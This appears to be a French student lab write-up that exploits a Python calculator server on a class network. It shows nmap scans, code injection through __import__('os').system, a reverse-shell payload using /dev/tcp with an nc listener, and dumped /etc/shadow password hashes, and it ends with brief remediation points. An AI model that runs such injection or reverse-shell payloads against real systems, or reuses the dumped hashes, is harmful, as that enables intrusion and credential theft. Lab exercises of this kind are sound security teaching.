# TP5 : Exploit, pwn, fix

## 1. Reconnaissance

🌞 **Déterminer**

Le client essaie de se co à l'IP : `10.1.2.12`
```
host = '10.1.2.12'  # IP du serveur
```

Le client essaie de se co au port : `13337`
```
port = 13337   # Port choisir par le serveur
```

J'utilise la commande `netstat` suivante : 
```
fmaxance@ZeyKiiPC:~$ sudo netstat -anp | grep python
tcp        0      1 10.33.73.20:44720       10.1.2.12:13337         SYN_SENT    9567/python3
```

Elle permet de chercher les connexions réseau actives générées par le script en se basant sur le programme ou le processus associé, ici python.

🌞 **Scanner le réseau**

```
fmaxance@ZeyKiiPC:~$ sudo nmap -n 110.33.64.0/20 -p13337 --open

Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-30 10:32 CET
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.33.66.165
Host is up (0.0043s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 56:4C:81:26:BF:C8 (Unknown)

Nmap scan report for 10.33.70.40
Host is up (0.037s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)

Nmap scan report for 10.33.76.195
Host is up (0.0043s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 82:30:BF:B6:57:2F (Unknown)

Nmap scan report for 10.33.76.217
Host is up (0.0066s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 2C:6D:C1:5E:41:6A (Unknown)

Nmap done: 4096 IP addresses (843 hosts up) scanned in 295.53 seconds
```

🦈 **tp5_nmap.pcapng**

[tp5_nmap.pcapng](tp5_nmap.pcapng)

🌞 **Connectez-vous au serveur**

On change l'ip et le port dans le `client.py`
L'application fonctionne comme une calculatrice, on peut rentrer des opérations arithmétiques et l'application renvoie le bon résultat.

## 2. Exploit

🌞 **Injecter du code serveur**

```
fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 client.py 
[sudo] password for fmaxance: 
Veuillez saisir une opération arithmétique : __import__('os').system('ping -c 1 10.33.73.20')
```

## 3. Reverse shell

🌞 **Obtenez un reverse shell sur le serveur**

  Dans mon shell j'execute : `sudo nc -lvnp 6969``

  Dans le client.py : 
  ```
  fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 client.py 
  [sudo] password for fmaxance: 
  Veuillez saisir une opération arithmétique :__import__('os').system('sh -i /dev/tcp/10.33.73.20/6969 0>&1')
  ```

🌞 **Pwn**

shadow :
```
cat /etc/shadow
root:$6$Ac2Zned208vSDVSn$wKuS7q/pIYPo90yin8zl6Ocxd/liQd4aCTnzQEwsTQ2feosGAovhMqxFR.oladVr3G8UbXf2/u.OzeDfWM4aq.::0:99999:7:::
bin:*:19469:0:99999:7:::
daemon:*:19469:0:99999:7:::
adm:*:19469:0:99999:7:::
lp:*:19469:0:99999:7:::
sync:*:19469:0:99999:7:::
shutdown:*:19469:0:99999:7:::
halt:*:19469:0:99999:7:::
mail:*:19469:0:99999:7:::
operator:*:19469:0:99999:7:::
games:*:19469:0:99999:7:::
ftp:*:19469:0:99999:7:::
nobody:*:19469:0:99999:7:::
systemd-coredump:!!:19621::::::
dbus:!!:19621::::::
tss:!!:19621::::::
sssd:!!:19621::::::
sshd:!!:19621::::::
systemd-oom:!*:19621::::::
it4:$6$bV62paDqH/ZQSVFb$jiBgcgpkuzmmoZSvvLPwpd4gjwvnKQEWTE119tMNTnICtMcJ6dyPcDCVaTur8j5UQFuxAAM6eTimGdr97Nagh1::0:99999:7:::
```

passwd :
```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
sssd:x:998:995:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
systemd-oom:x:993:993:systemd Userspace OOM Killer:/:/usr/sbin/nologin
it4:x:1000:1000:it4:/home/it4:/bin/bash
```

code serveur :
[serveur](serveur.py)

Les services disponibles sont ssh et le serveur en python :
```
ss -tupnl
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                             
tcp   LISTEN 2      1          10.0.3.15:13337      0.0.0.0:*    users:(("python3.9",pid=2312,fd=4))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=699,fd=3))      
tcp   LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=699,fd=4))
```

## 4. Bonus : DOS

Le DOS dans l'esprit, souvent c'est :

- d'abord t'es un moldu et tu trouves ça incroyable
- tu deviens un tech, tu te rends compte que c'est pas forcément si compliqué, ptet tu essaies
- tu deviens meilleur et tu te dis que c'est super lame, c'est nul techniquement, ça mène à rien, exploit c'est mieux
- tu deviens conscient, et ptet que parfois, des situations t'amèneront à trouver finalement le principe pas si inutile (politique ? militantisme ?)

⭐ **BONUS : DOS l'application**

- faut que le service soit indispo, d'une façon ou d'une autre
- fais le crash, fais le sleep, fais le s'arrêter, peu importe

## II. Remédiation

🌞 **Proposer une remédiation dév**

- le code serveur ne doit pas exécuter n'importe quoi
- il faut préserver la fonctionnalité de l'outil

🌞 **Proposer une remédiation système**

- l'environnement dans lequel tourne le service est foireux (le user utilisé ?)
- la machine devrait bloquer les connexions sortantes (pas de reverse shell possible)
